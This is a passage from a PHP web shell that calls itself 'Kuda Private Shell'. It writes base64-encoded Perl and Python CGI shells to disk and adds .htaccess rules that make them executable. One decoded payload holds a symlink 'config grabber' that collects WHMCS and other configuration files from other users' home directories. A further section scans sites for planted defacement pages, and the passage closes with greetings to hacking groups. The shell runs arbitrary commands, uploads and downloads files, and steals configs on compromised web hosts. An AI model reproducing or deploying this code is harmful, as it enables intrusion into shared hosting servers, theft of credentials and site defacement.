9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTEwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1BVUkNIQVNFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1B1cmNoYXNlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3B1cmNoYXNlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0FDQ09VTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQWNjb3VudC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1VTRVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvVXNlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC91c2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50cy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01ZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL015L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL215L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BhbmVsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGUvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydC9vcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0gKTsgZm9yZWFjaCAoQGFycmF5KXsgbXkgJGNvbmZpZ255YSA9ICRfLT57Y29uZmlnZGlyfTsgbXkgJHR5cGVjb25maWcgPSAkXy0+e3R5cGV9OyBzeW1saW5rKCIkY29uZmlnbnlhIiwic3ltbGlua19jb25maWcvJHVzZXJueWEtJHR5cGVjb25maWcudHh0Iik7IG1rZGlyICJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQiOyBzeW1saW5rKCIkY29uZmlnbnlhIiwic3ltbGlua19jb25maWcvJHVzZXJueWEtJHR5cGVjb25maWcudHh0NDA0L3BwcS50eHQiKTsgY29weSgic3ltbGlua19jb25maWcvbmVtdS50eHQiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQvLmh0YWNjZXNzIikgOyB9IH0gcHJpbnQgInN1Y2Nlc3MiOw0KfQ0Kc3ViIEhlbHANCnsNCnByaW50ICI8Y29kZT4gSG93IFRvIFVzZXIgU3ltbGluayArIENvbmZpZyBHcmFiYmVyPyBKdXN0IEtsaWsgU3ltbGluayArIENvbmZpZyBHcmFiYmVyPGJyPiI7DQpwcmludCAiIFRoZW4gQ2hlY2sgRGlycyBCeSBFbnRlciBUaGUgVVJMPGJyPiI7DQpwcmludCAiIEV4YW1wbGU6IHNpdGUuY29tL2NnaWRpcnMvc3ltbGlua19jb25maWc8YnI+IjsNCnByaW50ICIgRm9yIFN5bWxpbmsgSnVzdCBBZGQgSW4gVXJsPGJyPiI7DQpwcmludCAiIEV4YW1wbGU6IHNpdGUuY29tL2NnaWRpcnMvc3ltbGlua19jb25maWcvcm9vdC88L2NvZGU+IjsNCn0NCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcg0Kew0KbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZw0Kew0KaWYoJFdpbk5UKQ0Kew0KYmlubW9kZShTRU5ERklMRSk7DQpiaW5tb2RlKFNURE9VVCk7DQp9DQokRmlsZVNpemUgPSAoc3RhdCgkU2VuZEZpbGUpKVs3XTsNCigkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+IG0hKFteL15cXF0qKSQhOw0KcHJpbnQgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQpwcmludCAiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9JDFcblxuIjsNCnByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KY2xvc2UoU0VOREZJTEUpOw0KfQ0KZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCnByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAkITwvY29kZT4iOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQp9DQoNCg0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCiMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCmlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQp7DQokVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQp9DQplbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0Kew0KY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQp9DQoNCmlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQp7DQomU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KfQ0KZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCnsNCiZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KfQ0KfQ0Kc3ViIFVwbG9hZEZpbGUNCnsNCiMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCiZQcmludEZpbGVVcGxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCnJldHVybjsNCn0NCiZQcmludFBhZ2VIZWFkZXIoImMiKTsNCg0KIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCnByaW50ICI8Y29kZT5VcGxvYWRpbmcgJFRyYW5zZmVyRmlsZSB0byAkQ3VycmVudERpci4uLjxicj4iOw0KDQojIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQpjaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7DQokVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQojIGlmIHRoZSBmaWxlIGV4aXN0cyBhbmQgd2UgYXJlIG5vdCBzdXBwb3NlZCB0byBvdmVyd3JpdGUgaXQNCmlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0Kew0KcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsNCn0NCmVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50DQp7DQppZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkNCnsNCmJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQpjbG9zZShVUExPQURGSUxFKTsNCnByaW50ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsNCnByaW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQp9DQplbHNlDQp7DQpwcmludCAiRmFpbGVkOiAkITxicj4iOw0KfQ0KfQ0KcHJpbnQgIjwvY29kZT4iOw0KJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQpzdWIgRG93bmxvYWRGaWxlDQp7DQojIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCiZQcmludEZpbGVEb3dubG9hZEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KcmV0dXJuOw0KfQ0KDQojIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQppZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCighJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0Kew0KJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KfQ0KZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCnsNCmNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQokVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KfQ0KDQppZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0Kew0KJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCn0NCmVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQp7DQomUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCn0NCn0NCg0KJlJlYWRQYXJzZTsNCiZHZXRDb29raWVzOw0KDQokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9Ow0KJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb25zID0gJGlueydvJ307DQoNCiRBY3Rpb24gPSAkaW57J2EnfTsNCiRBY3Rpb24gPSAiY29tbWFuZCIgaWYoJEFjdGlvbiBlcSAiIik7DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJGlueydkJ307DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQppZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCiZFeGVjdXRlQ29tbWFuZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQomVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KJkRvd25sb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInN5bWNvbmZpZyIpDQp7DQomUHJpbnRQYWdlSGVhZGVyOw0KcHJpbnQgJlN5bUNvbmZpZzsNCn1lbHNpZigkQWN0aW9uIGVxICJoZWxwIikNCnsNCiZQcmludFBhZ2VIZWFkZXI7DQpwcmludCAmSGVscDsNCn0=";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
    chmod($memeg, 0755);
	echo "<center>Done <a href='kuda_cgi/cgi2.kuda' target='_blank'><font color='lime'>Click Here</a></font>";
} if(isset($_POST['cgipy'])) {
	$cgi_dir = mkdir('kuda_cgi', 0755);
    chdir('kuda_cgi');
	$file_cgi = "cgipy.kuda";
    $memeg = ".htaccess";
	$isi_htcgi = "Options Indexes Includes ExecCGI FollowSymLinks\nAddType application/x-httpd-cgi .kuda\nAddHandler cgi-script .kuda\nAddHandler cgi-script .kuda";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9weXRob24NCiMgMDctMDctMDQNCiMgdjEuMC4wDQoNCiMgY2dpLXNoZWxsLnB5DQojIEEgc2ltcGxlIENHSSB0aGF0IGV4ZWN1dGVzIGFyYml0cmFyeSBzaGVsbCBjb21tYW5kcy4NCg0KDQojIENvcHlyaWdodCBNaWNoYWVsIEZvb3JkDQojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQgcmVsaWNlbnNlIHRoaXMgY29kZS4NCg0KIyBObyB3YXJyYW50eSBleHByZXNzIG9yIGltcGxpZWQgZm9yIHRoZSBhY2N1cmFjeSwgZml0bmVzcyB0byBwdXJwb3NlIG9yIG90aGVyd2lzZSBmb3IgdGhpcyBjb2RlLi4uLg0KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISENCg0KIyBFLW1haWwgbWljaGFlbCBBVCBmb29yZCBET1QgbWUgRE9UIHVrDQojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsvYXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbA0KDQoiIiINCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8gZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLg0KIiIiDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIEltcG9ydHMNCnRyeToNCiAgICBpbXBvcnQgY2dpdGI7IGNnaXRiLmVuYWJsZSgpDQpleGNlcHQ6DQogICAgcGFzcw0KaW1wb3J0IHN5cywgY2dpLCBvcw0Kc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQNCmZyb20gdGltZSBpbXBvcnQgc3RyZnRpbWUNCmltcG9ydCB0cmFjZWJhY2sNCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPDQpmcm9tIHRyYWNlYmFjayBpbXBvcnQgcHJpbnRfZXhjDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgY29uc3RhbnRzDQoNCmZvbnRsaW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQtc2l6ZToxMnB0OyI+Jw0KdmVyc2lvbnN0cmluZyA9ICdWZXJzaW9uIDEuMC4wIDd0aCBKdWx5IDIwMDQnDQoNCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToNCiAgICBzY3JpcHRuYW1lID0gb3MuZW52aXJvblsiU0NSSVBUX05BTUUiXQ0KZWxzZToNCiAgICBzY3JpcHRuYW1lID0gIiINCg0KTUVUSE9EID0gJyJQT1NUIicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBQcml2YXRlIGZ1bmN0aW9ucyBhbmQgdmFyaWFibGVzDQoNCmRlZiBnZXRmb3JtKHZhbHVlbGlzdCwgdGhlZm9ybSwgbm90cHJlc2VudD0nJyk6DQogICAgIiIiVGhpcyBmdW5jdGlvbiwgZ2l2ZW4gYSBDR0kgZm9ybSwgZXh0cmFjdHMgdGhlIGRhdGEgZnJvbSBpdCwgYmFzZWQgb24NCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFsdWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLg0KICAgIChlLmcuIHRvIHJldHVybiBOb25lIHNvIHlvdSBjYW4gdGVzdCBmb3IgbWlzc2luZyBrZXl3b3JkcyAtIHdoZXJlICcnIGlzIGEgdmFsaWQgYW5zd2VyIGJ1dCB0byBoYXZlIHRoZSBmaWVsZCBtaXNzaW5nIGlzbid0LikiIiINCiAgICBkYXRhID0ge30NCiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0Og0KICAgICAgICBpZiBub3QgdGhlZm9ybS5oYXNfa2V5KGZpZWxkKToNCiAgICAgICAgICAgIGRhdGFbZmllbGRdID0gbm90cHJlc2VudA0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgaWYgIHR5cGUodGhlZm9ybVtmaWVsZF0pICE9IHR5cGUoW10pOg0KICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdGhlZm9ybVtmaWVsZF0udmFsdWUNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgdmFsdWVzID0gbWFwKGxhbWJkYSB4OiB4LnZhbHVlLCB0aGVmb3JtW2ZpZWxkXSkgICAgICMgYWxsb3dzIGZvciBsaXN0IHR5cGUgdmFsdWVzDQogICAgICAgICAgICAgICAgZGF0YVtmaWVsZF0gPSB2YWx1ZXMNCiAgICByZXR1cm4gZGF0YQ0KDQoNCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1zaGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+DQo8Qk9EWT48Q0VOVEVSPg0KPEgxPldlbGNvbWUgdG8gY2dpLXNoZWxsLnB5IC0gPEJSPmEgUHl0aG9uIENHSTwvSDE+DQo8Qj48ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPg0KIiIiK2ZvbnRsaW5lICsiVmVyc2lvbiA6ICIgKyB2ZXJzaW9uc3RyaW5nICsgIiIiLCBSdW5uaW5nIG9uIDogIiIiICsgc3RyZnRpbWUoJyVJOiVNICVwLCAlQSAlZCAlQiwgJVknKSsnLjwvQ0VOVEVSPjxCUj4nDQoNCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIgQ29tbWFuZDwvSDI+DQo8Rk9STSBNRVRIT0Q9XCIiIiIgKyBNRVRIT0QgKyAnIiBhY3Rpb249IicgKyBzY3JpcHRuYW1lICsgIiIiXCI+DQo8aW5wdXQgbmFtZT1jbWQgdHlwZT10ZXh0PjxCUj4NCjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+DQo8L0ZPUk0+PEJSPjxCUj4iIiINCmJvZHllbmQgPSAnPC9CT0RZPjwvSFRNTD4nDQplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5nIFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBtYWluIGJvZHkgb2YgdGhlIHNjcmlwdA0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIHByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyDQogICAgcHJpbnQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgc28gaXMgdGhpcyBibGFuayBsaW5lDQogICAgZm9ybSA9IGNnaS5GaWVsZFN0b3JhZ2UoKQ0KICAgIGRhdGEgPSBnZXRmb3JtKFsnY21kJ10sZm9ybSkNCiAgICB0aGVjbWQgPSBkYXRhWydjbWQnXQ0KICAgIHByaW50IHRoZWZvcm1oZWFkDQogICAgcHJpbnQgdGhlZm9ybQ0KICAgIGlmIHRoZWNtZDoNCiAgICAgICAgcHJpbnQgJzxIUj48QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJ1Jlc3VsdCA6IDxCUj48QlI+Jw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZGluLmNsb3NlKCkNCiAgICAgICAgICAgIHJlc3VsdCA9IGNoaWxkX3N0ZG91dC5yZWFkKCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpDQogICAgICAgICAgICBwcmludCByZXN1bHQucmVwbGFjZSgnXG4nLCAnPEJSPicpDQoNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNvbW1hbmQNCiAgICAgICAgICAgIHByaW50IGVycm9ybWVzcw0KICAgICAgICAgICAgZiA9IFN0cmluZ0lPKCkNCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpDQogICAgICAgICAgICBhID0gZi5nZXR2YWx1ZSgpLnNwbGl0bGluZXMoKQ0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gYToNCiAgICAgICAgICAgICAgICBwcmludCBsaW5lDQoNCiAgICBwcmludCBib2R5ZW5kDQoNCg0KIiIiDQpUT0RPL0lTU1VFUw0KDQoNCg0KQ0hBTkdFTE9HDQoNCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wDQpBIHZlcnkgYmFzaWMgc3lzdGVtIGZvciBleGVjdXRpbmcgc2hlbGwgY29tbWFuZHMuDQpJIG1heSBleHBhbmQgaXQgaW50byBhIHByb3BlciAnZW52aXJvbm1lbnQnIHdpdGggc2Vzc2lvbiBwZXJzaXN0ZW5jZS4uLg0KIiIi";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
    chmod($memeg, 0755);
	echo "<center>Done <a href='kuda_cgi/cgipy.kuda' target='_blank'><font color='lime'>Click Here</a></font>";
}
echo "</center>";
echo "</center>";
echo "</center>";
echo "</center>";
}
elseif($_GET['do'] == 'fake_root') {
    ob_start();
    $cwd = getcwd();
    $ambil_user = explode("/", $cwd);
    $user = $ambil_user[2];
    if($_POST['reverse']) {
        $site = explode("\r\n", $_POST['url']);
        $file = $_POST['file'];
        foreach($site as $url) {
            $cek = getsource("$url/~$user/$file");
            if(preg_match("/hacked/i", $cek)) {
                echo "<center>URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font></center><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
        Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
        User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
        Domain: <br>
        <textarea style='width: 450px; height: 250px;' name='url'>";
        reverse($_SERVER['HTTP_HOST']);
        echo "</textarea><br>
        <input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
        </form><br>
        NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
    }
}
elseif($_GET['do'] == 'about') {
    ?>
  <tr>
    <td>
      <center>
        <h3 style='color: cyan;'>Kuda Private Shell Recoded From Nusantara Blackhat Shell</h3>
        <p style='color: white;'>GreetZ:</p>
        <font color="cyan">[</font>
        <marquee direction="left" scrollamount="10" style="width: 50%;">All Member From BabbyCyberTeam - IndoXploit - Nusantara Blackhat And You:)</marquee>
        <font color="cyan">]</font>
        <p>Gue gans, thanks:)</p>
      </center>
    </td>
  </tr>
<?php
}
elseif($_GET['do'] == 'contact') {
	echo "<center><h3>Contact Orang Gans</h3>
	<table><td style='background-color: transparent; text-align: center; border: 2px aqua dotted; width:300px; height:60px;'>
	<font color='cyan'>Email: mrxbarakuda@merahputih.id<br>Instagram: <a href='https://instagram.com/x_barakuda' target='_blank'>x_barakuda</a></font></tr></td></table></center>";
}
